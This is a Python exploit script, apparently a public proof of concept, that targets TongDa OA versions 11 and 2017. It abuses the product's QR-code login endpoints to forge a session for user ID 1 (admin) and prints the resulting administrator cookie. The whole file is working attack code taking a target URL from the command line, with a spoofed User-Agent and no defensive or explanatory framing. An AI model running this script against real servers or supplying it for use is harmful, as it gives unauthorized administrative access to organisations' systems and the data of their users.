'''
@Author         : Sp4ce
@Date           : 2020-03-17 23:42:16
LastEditors    : Sp4ce
LastEditTime   : 2020-08-27 10:21:44
@Description    : Challenge Everything.
'''
import requests
from random import choice
import argparse
import json

USER_AGENTS = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
]

headers={}

def getV11Session(url):
    checkUrl = url+'/general/login_code.php'
    try:
        headers["User-Agent"] = choice(USER_AGENTS)
        res = requests.get(checkUrl,headers=headers)
        resText = str(res.text).split('{')
        codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
        getSessUrl = url+'/logincheck_code.php'
        res = requests.post(
            getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers)
        tmp_cookie = res.headers['Set-Cookie']
        headers["User-Agent"] = choice(USER_AGENTS)
        headers["Cookie"] = tmp_cookie
        check_available = requests.get(url + '/general/index.php',headers=headers)
        if '用户未登录' not in check_available.text:
            if '重新登录' not in check_available.text:
                print('[+]Get Available COOKIE:' + tmp_cookie)
        else:
            print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')
    except:
        print('[-]Something Wrong With '+url)



def get2017Session(url):
    checkUrl = url+'/ispirit/login_code.php'
    try:
        headers["User-Agent"] = choice(USER_AGENTS)
        res = requests.get(checkUrl,headers=headers)
        resText = json.loads(res.text)
        codeUid = resText['codeuid']
        codeScanUrl = url+'/general/login_code_scan.php'
        res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(
            1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers)
        resText = json.loads(res.text)
        status = resText['status']
        if status == str(1):
            getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid
            res = requests.get(getCodeUidUrl)
            tmp_cookie = res.headers['Set-Cookie']
            headers["User-Agent"] = choice(USER_AGENTS)
            headers["Cookie"] = tmp_cookie
            check_available = requests.get(url + '/general/index.php',headers=headers)
            if '用户未登录' not in check_available.text:
                if '重新登录' not in check_available.text:
                    print('[+]Get Available COOKIE:' + tmp_cookie)
            else:
                print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')
        else:
            print('[-]Something Wrong With '+url  + ' Maybe Not Vulnerable ?')
    except:
        print('[-]Something Wrong With '+url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-v",
        "--tdoaversion",
        type=int,
        choices=[11, 2017],
        help="Target TongDa OA Version. e.g: -v 11、-v 2017")
    parser.add_argument(
        "-url",
        "--targeturl",
        type=str,
        help="Target URL. e.g: -url 192.168.2.1、-url http://192.168.2.1"
    )
    args = parser.parse_args()
    url = args.targeturl
    if 'http://' not in url:
        url = 'http://' + url
    if args.tdoaversion == 11:
        getV11Session(url)
    elif args.tdoaversion == 2017:
        get2017Session(url)
    else:
        parser.print_help()
